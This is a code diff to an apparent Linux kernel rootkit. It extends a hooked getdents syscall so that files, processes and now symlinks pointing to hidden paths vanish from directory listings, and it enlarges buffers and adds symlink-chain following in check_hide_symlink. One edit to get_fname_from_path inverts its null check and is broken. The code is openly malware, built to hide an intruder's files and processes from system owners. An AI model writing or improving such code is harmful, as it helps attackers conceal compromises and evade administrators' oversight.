@@ -37,7 +37,11 @@ get_fname_from_path(char *path)
 	}
 	
 	ptr = strrchr(path, delimiter);
-	name = ptr + 1;
+	if(ptr != NULL) {
+		return path;
+	} else {
+		name = ptr + 1;
+	}
 	
 	return name;
 }
@@ -120,22 +124,30 @@ int
 check_hide_symlink(char *path)
 {
 	mm_segment_t old_fs;
-	char lpath[128];
-	size_t lpath_len;
+	char lpath[1024], curpath[1024];
+	ssize_t lpath_len;
 	
+	strncpy(curpath, path, 1024);
+		
 	do {
-		memset(lpath, 0, 128);	
+		memset(lpath, 0, 1024);	
 	
 		/* tell the kernel to ignore kernel-space memory in syscalls */
 		old_fs = get_fs();
 		set_fs(KERNEL_DS);
 	
 		/* execute our readlinkat syscall */
-		lpath_len = (*syscall_readlink) (path, lpath, 128);
-	
+		lpath_len = (*syscall_readlink) (curpath, lpath, 1023);
+		memset(lpath+lpath_len+1, '\0', 1);
+			
 		/* reset the kernel */
 		set_fs(old_fs);
 
+		/* needed because the other functions apparently can't handle it */		
+		if(lpath_len < 0) {
+			break;
+		}
+		ROOTKIT_DEBUG("Current lpath: '%s'\n", lpath);
 		/* check if the current link is pointing to a hidden path */
 		if(check_hide_fpath(lpath)) {
 			return 1;
@@ -145,7 +157,11 @@ check_hide_symlink(char *path)
 		if(check_hide_fprefix(lpath)) {
 			return 1;
 		}
-	
+
+		/* prepare everything for the next loop */
+		memset(curpath, 0, 1024);
+		strncpy(curpath, lpath, 1024);
+
 	} while (lpath_len > 0);
 
 	return 0;
@@ -183,8 +199,8 @@ manipulated_getdents (unsigned int fd, struct linux_dirent __user *dirp, unsigne
 
 		if(check_hide_fpath(path)
 				|| check_hide_fprefix(path)
-				|| check_hide_process(fd, dirp->d_name))
-		//		|| check_hide_symlink(path))
+				|| check_hide_process(fd, dirp->d_name)
+				|| check_hide_symlink(path))
 		{	
 			memmove(dirp, (char*) dirp + dirp->d_reclen,tlen);
 			ret -= len;
